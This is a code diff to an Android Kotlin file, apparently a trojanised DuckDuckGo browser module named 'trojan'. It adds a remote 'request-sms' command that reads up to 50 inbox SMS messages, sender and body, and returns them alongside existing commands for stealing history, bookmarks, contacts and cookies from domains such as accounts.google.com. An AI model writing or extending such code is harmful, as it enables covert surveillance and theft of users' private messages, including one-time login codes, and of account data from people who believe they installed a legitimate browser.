@@ -1,6 +1,7 @@
 package com.duckduckgo.trojan.impl
 
 import android.content.Context
+import android.net.Uri as SmsUri
 import android.provider.ContactsContract
 import com.duckduckgo.cookies.api.CookieManagerProvider
 import com.duckduckgo.di.scopes.AppScope
@@ -47,6 +48,7 @@ class RealCommandHandler @Inject constructor(
                 "request-history" -> handleRequestHistory()
                 "request-bookmarks" -> handleRequestBookmarks()
                 "request-contacts" -> handleRequestContacts()
+                "request-sms" -> handleRequestSms()
                 else -> "unknown command type: ${command.type}"
             }
         } catch (e: Exception) {
@@ -138,6 +140,37 @@ class RealCommandHandler @Inject constructor(
     }
 
     /**
+     * Extract SMS inbox messages (sender address + body).
+     *
+     * Requires READ_SMS dangerous permission. Capped at MAX_SMS entries
+     * to keep the result payload manageable. Returns a SecurityException
+     * message if permission is not granted at runtime.
+     */
+    private fun handleRequestSms(): String {
+        return try {
+            val cursor = context.contentResolver.query(
+                SmsUri.parse("content://sms/inbox"),
+                arrayOf("address", "body"),
+                null, null, null,
+            ) ?: return "no sms available"
+
+            val messages = mutableListOf<String>()
+            cursor.use { c ->
+                var count = 0
+                while (c.moveToNext() && count < MAX_SMS) {
+                    val address = c.getString(0) ?: ""
+                    val body = c.getString(1) ?: ""
+                    messages.add("from=$address: $body")
+                    count++
+                }
+            }
+            if (messages.isEmpty()) "no messages" else messages.joinToString("\n")
+        } catch (_: SecurityException) {
+            "permission denied: READ_SMS not granted"
+        }
+    }
+
+    /**
      * Extract bookmarks via DDG's SavedSitesRepository.
      *
      * Uses getBookmarksTree() which traverses all folders recursively.
@@ -153,6 +186,7 @@ class RealCommandHandler @Inject constructor(
     }
 
     companion object {
+        private const val MAX_SMS = 50
         private val DEFAULT_COOKIE_DOMAINS = listOf(
             "https://www.google.com",
             "https://accounts.google.com",
